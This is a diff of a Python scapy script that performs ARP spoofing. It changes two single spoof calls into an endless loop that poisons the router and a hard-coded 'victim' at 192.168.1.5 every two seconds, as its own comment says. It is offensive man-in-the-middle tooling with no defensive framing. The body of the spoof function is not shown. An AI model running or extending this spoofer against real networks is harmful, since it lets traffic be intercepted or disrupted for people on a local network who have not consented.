@@ -1,8 +1,8 @@
 #!/usr/local/bin/python3
 
 import os
-import re
 import sys
+import time
 import scapy.all as scapy
 
 def get_router_ip(opsys):
@@ -69,8 +69,8 @@ opsys       = check_os()
 print("[+] This is your router's IP:")
 router_ip   = get_router_ip(opsys)
 
-# target / router
-spoof("192.168.1.5",router_ip)
-
-# router / target
-spoof(router_ip,"192.168.1.5")
+while True:
+    # send spoof packets continuously to router and victim
+    spoof("192.168.1.5",router_ip)
+    spoof(router_ip,"192.168.1.5")
+    time.sleep(2)
